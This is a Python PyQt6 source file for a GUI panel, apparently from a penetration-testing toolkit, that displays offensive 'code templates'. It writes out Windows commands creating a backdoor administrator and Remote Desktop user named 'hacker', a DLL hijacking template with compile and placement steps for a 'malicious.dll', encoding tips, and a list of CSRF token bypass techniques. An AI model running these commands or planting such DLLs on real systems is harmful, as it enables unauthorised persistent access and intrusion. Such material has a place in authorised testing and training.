# app/components/scripts/code_templates_component.py
from PyQt6.QtWidgets import QWidget, QVBoxLayout, QHBoxLayout, QFrame, QLabel, QPushButton, QTextEdit

class CodeTemplatesComponent(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setup_ui()

    def setup_ui(self):
        layout = QHBoxLayout(self)
        
        # Left panel - template types
        left_panel = QFrame()
        left_panel.setFixedWidth(200)
        left_layout = QVBoxLayout(left_panel)
        
        left_layout.addWidget(QLabel("Code Templates:"))
        
        buttons = [
            ("User Creation", self.show_user_creation_script),
            ("DLL Hijacking", self.show_dll_hijacking_code),
            ("Encoding Tools", self.show_encoding_tools),
            ("CSRF Tools", self.show_csrf_tools)
        ]
        
        for text, method in buttons:
            btn = QPushButton(text)
            btn.clicked.connect(method)
            btn.setMinimumHeight(35)
            left_layout.addWidget(btn)
        
        left_layout.addStretch()
        
        # Right panel - template output
        right_panel = QFrame()
        right_layout = QVBoxLayout(right_panel)
        
        self.template_output = QTextEdit()
        self.template_output.setReadOnly(True)
        self.template_output.setPlaceholderText("Code templates will appear here...")
        right_layout.addWidget(self.template_output)
        
        layout.addWidget(left_panel)
        layout.addWidget(right_panel)

    def show_user_creation_script(self):
        script = """net user hacker password123 /add
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add"""
        self.template_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>Windows User Creation Script</div>
        <div style='color: #00FF41; font-size: 14pt; font-family: monospace; background: #1a1a1a; padding: 15px; margin: 15px 0;'>
        {script}
        </div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>Description:</b> Creates a new user 'hacker' with password 'password123' and adds to administrators group.
        <br><br><b>Usage:</b> Execute in elevated command prompt
        </div>
        """)

    def show_dll_hijacking_code(self):
        dll_code = """#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        // Your payload here
        system("calc.exe");
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}"""
        self.template_output.setHtml(f"""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>DLL Hijacking Template</div>
        <div style='color: #00FF41; font-size: 12pt; font-family: monospace; background: #1a1a1a; padding: 15px; margin: 15px 0;'>
        {dll_code}
        </div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>Compilation:</b> gcc -shared -o malicious.dll dll_code.c
        <br><br><b>Usage:</b> Place in application directory with vulnerable DLL name
        </div>
        """)

    def show_encoding_tools(self):
        self.template_output.setHtml("""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>Encoding Tools</div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>JavaScript Encoding:</b><br>
        • encodeURIComponent() - URL encoding<br>
        • btoa() - Base64 encoding<br>
        • String.fromCharCode() - Character code conversion<br><br>
        
        <b>URL Encoding:</b><br>
        • %20 = space<br>
        • %3C = &lt;<br>
        • %3E = &gt;<br>
        • %22 = "<br>
        • %27 = '
        </div>
        """)

    def show_csrf_tools(self):
        self.template_output.setHtml("""
        <div style='color: #64C8FF; font-size: 18pt; font-weight: bold;'>CSRF Tools</div>
        <div style='color: #DCDCDC; font-size: 14pt;'>
        <b>CSRF Token Extraction:</b><br>
        • Look for hidden input fields with names like 'csrf_token', '_token', 'authenticity_token'<br>
        • Check meta tags in HTML head<br>
        • Examine HTTP headers for CSRF tokens<br><br>
        
        <b>Bypass Techniques:</b><br>
        • Remove CSRF token entirely<br>
        • Use empty token value<br>
        • Use token from different session<br>
        • Change request method (POST to GET)
        </div>
        """)